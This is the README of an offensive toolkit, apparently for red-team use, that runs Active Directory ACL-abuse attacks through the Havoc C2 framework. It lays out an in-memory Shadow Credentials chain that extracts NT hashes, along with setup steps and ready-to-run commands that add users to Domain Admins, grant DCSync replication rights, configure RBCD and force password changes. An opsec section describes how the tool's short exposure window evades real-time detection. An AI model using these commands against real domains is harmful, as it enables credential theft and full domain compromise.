# acl-abuse-havoc

BOF toolkit for abusing Active Directory ACL misconfigurations through Havoc C2. The main piece is `acl-shadow`, a full Shadow Credentials attack chain that runs entirely in-memory, no external tooling on disk.

## What's inside

| Command | Right Abused | Transport |
|---|---|---|
| `acl-shadow` | GenericWrite / GenericAll | LDAP + Kerberos/88 |
| `acl-fcp` | ForceChangePassword | LDAPS |
| `acl-addmember` | WriteMembers / GenericAll | LDAP |
| `acl-owner` | WriteOwner | LDAPS |
| `acl-rbcd` | GenericWrite on computer | LDAP |
| `acl-dcsync` | WriteDACL on domain | LDAP |
| `acl-genericall` | WriteDACL | LDAP |
| `acl-ace` | Custom ACE | LDAP |

## acl-shadow

Full inline Shadow Credentials chain, keygen to NT hash to cleanup.

```
1.  LDAP lookup         resolve target DN + objectSid
2.  RSA keypair         2048-bit, generated in-process
3.  Certificate         self-signed, UPN SAN + SID URL (KB5014754)
4.  KeyCredential       build msDS-KeyCredentialLink blob (MS-ADTS §2.2.20)
5.  LDAP write          add KeyCredential to target object
6.  PKINIT AS-REQ       PA-PK-AS-REQ, DH key exchange (MODP Group 2)
7.  AS-REP              derive reply key via kTruncate (RFC 4556 §3.2.3.1)
8.  U2U TGS-REQ         service ticket encrypted with session key
9.  PAC decrypt         PAC_CREDENTIAL_INFO -> NT hash
10. Cleanup             remove KeyCredential from msDS-KeyCredentialLink
```

The entire window from write to cleanup is under 5 seconds.

**Encryption types:** AES256-CTS-HMAC-SHA1-96, AES128-CTS-HMAC-SHA1-96, RC4-HMAC, the KDC negotiates from this list, so environments that only support a subset are handled automatically.

**Target requirements:**
- Windows Server 2016+ DC
- AD CS with the `Kerberos Authentication` certificate template
- GenericWrite or GenericAll on the target object

**Output:**
```
[+] KeyCredential written (DeviceId: ...)
[+] pfx (base64, no password): ...
[+] pkinit :: TGT obtained
[+] tgt (kirbi b64): ...
[+] NT Hash: aabbccdd11223344aabbccdd11223344
[+] keycred :: removed from msDS-KeyCredentialLink
```

## Setup

```bash
git clone https://github.com/0xM4L/acl-abuse-havoc
cd acl-abuse-havoc
make
```

Load `acl-abuse.py` via Script Manager in the Havoc client.

**Dependencies:** `mingw-w64`, x64 only.

## Usage

```
acl-shadow <target> <domain> [dc]
acl-fcp <target> <newpassword>
acl-addmember <group> <user> <domain>
acl-owner <target> <newowner> <domain>
acl-rbcd <computer> <principal> <domain>
acl-dcsync "DC=domain,DC=local" <user> [dc]
acl-genericall <target> <user> <domain>
acl-ace <target> <trustee> <access_mask> [ace_type] [ace_flags] [object_guid] [inherited_guid] [dc]
```

All commands accept an optional `[dc]` as the last argument. Omit it and the DC is auto-discovered via `DsGetDcNameW`.

**Examples:**
```
acl-shadow jsmith vuln.local
acl-shadow jsmith vuln.local dc01.vuln.local
acl-fcp jsmith Password123!
acl-addmember "Domain Admins" jsmith vuln.local
acl-owner jsmith attacker vuln.local
acl-rbcd WS01$ attacker$ vuln.local
acl-dcsync "DC=vuln,DC=local" jsmith
acl-genericall jsmith attacker vuln.local
acl-ace jsmith attacker GenericAll
```

## Notes

- `acl-fcp` and `acl-owner` go over LDAPS (port 636). If they're not working, make sure LDAPS is reachable from the beacon.
- `acl-dcsync` takes the full domain DN (`DC=domain,DC=local`). Drops `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` in one shot.
- `acl-shadow` writes and cleans up the KeyCredential in the same run. The exposure window is under 5 seconds.
- Everything runs as the current beacon user via Negotiate.
- DC auto-discovery works in most cases. Pass it explicitly if the network is segmented.
- Arguments with spaces or special characters need quotes (`"Domain Admins"`, `"DC=vuln,DC=local"`).

## Opsec

`acl-shadow` touches two protocols: LDAP for the KeyCredential write/delete and Kerberos for the PKINIT + U2U exchange. On the defensive side, the LDAP write generates event **5136** (directory object modified) on the target's `msDS-KeyCredentialLink` attribute, and the PKINIT authentication generates event **4768** with certificate info. The cleanup removes the attribute value, but the 5136 for the initial write is already logged. The <5s window between write and cleanup makes it harder to catch in real-time, but forensic analysis will still see both events.

No artifacts are written to disk. The RSA keypair, certificate, and PFX all live in memory for the duration of the BOF execution.
## Demo

https://github.com/user-attachments/assets/03f03921-5b62-4107-9890-1f09f65a1334

## Credits

Shadow Credentials BOF based on [RayRRT/BOFs](https://github.com/RayRRT/BOFs), integration, debugging, etype negotiation, and Havoc wrapper by [0xM4L](https://github.com/0xM4L).
LDAP BOFs reference [P0142/LDAP-Bof-Collection](https://github.com/P0142/LDAP-Bof-Collection).
